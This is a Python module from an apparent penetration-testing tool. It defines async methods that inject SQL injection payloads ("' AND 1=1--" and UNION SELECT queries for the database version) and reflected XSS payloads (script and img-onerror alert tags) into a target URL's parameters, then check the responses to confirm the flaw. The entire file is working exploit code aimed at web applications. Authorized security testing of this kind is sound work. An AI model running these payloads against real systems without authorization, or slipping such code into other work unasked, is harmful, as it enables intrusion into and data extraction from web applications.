"""SQLi and XSS exploitation methods."""

import re
from urllib.parse import parse_qs, urlparse

from clawpwn.tools.http import HTTPClient

from .models import ExploitResult


class SQLXSSMixin:
    """Provide SQL injection and XSS exploit methods."""

    async def exploit_sql_injection(
        self,
        target: str,
        parameter: str,
        technique: str = "error_based",
    ) -> ExploitResult:
        """Attempt to exploit a SQL injection vulnerability."""
        print(f"[*] Attempting SQL injection on {target}")
        result = ExploitResult(
            success=False,
            title="SQL Injection Exploit",
            target=target,
            technique=technique,
        )

        try:
            async with HTTPClient() as client:
                parsed = urlparse(target)
                params = parse_qs(parsed.query)
                if parameter not in params:
                    result.error = f"Parameter '{parameter}' not found in URL"
                    return result

                test_params = {key: values[0] if values else "" for key, values in params.items()}
                test_payload = "' AND 1=1--"
                test_params[parameter] = test_payload
                response = await client.request("GET", target, params=test_params)

                if any(token in response.body.lower() for token in ["sql", "mysql", "syntax"]):
                    result.success = True
                    result.output = "SQL injection confirmed - database error triggered"
                    result.notes = f"Payload: {test_payload}"
                    await self._try_extract_db_version(
                        client, target, parameter, test_params, result
                    )
        except Exception as exc:
            result.error = str(exc)

        if result.success:
            print("[+] SQL Injection successful!")
            if self.session:
                self.session.add_log(
                    f"Exploited SQL injection on {target}",
                    level="WARNING",
                    phase="Exploitation",
                )
        else:
            print(f"[-] SQL Injection failed: {result.error}")

        return result

    async def _try_extract_db_version(
        self,
        client: HTTPClient,
        target: str,
        parameter: str,
        test_params: dict[str, str],
        result: ExploitResult,
    ) -> None:
        payloads = ["' UNION SELECT @@version--", "' UNION SELECT version()--"]
        for payload in payloads:
            test_params[parameter] = payload
            response = await client.request("GET", target, params=test_params)
            body = response.body or ""
            if re.search(r"\d+\.\d+(?:\.\d+)*", body) or "MariaDB" in body:
                result.output += "\nDatabase version information extracted"
                return

    async def exploit_xss(
        self,
        target: str,
        parameter: str,
        payload_type: str = "alert",
    ) -> ExploitResult:
        """Exploit XSS vulnerability (verification oriented)."""
        print(f"[*] Verifying XSS on {target}")
        result = ExploitResult(
            success=False,
            title="Cross-Site Scripting (XSS)",
            target=target,
            technique="reflected",
        )

        payload = (
            "<script>alert('XSS')</script>"
            if payload_type == "alert"
            else "<img src=x onerror=alert('XSS')>"
        )

        try:
            async with HTTPClient() as client:
                parsed = urlparse(target)
                params = parse_qs(parsed.query)
                if parameter not in params:
                    result.error = f"Parameter '{parameter}' not found in URL"
                    return result

                test_params = {key: values[0] if values else "" for key, values in params.items()}
                test_params[parameter] = payload
                response = await client.request("GET", target, params=test_params)

                if payload in response.body:
                    result.success = True
                    result.output = f"XSS payload reflected unencoded\nPayload: {payload}"
                    if "<script>" in response.body:
                        result.technique = "reflected_stored"
        except Exception as exc:
            result.error = str(exc)

        if result.success:
            print("[+] XSS confirmed!")
        else:
            print(f"[-] XSS verification failed: {result.error}")

        return result
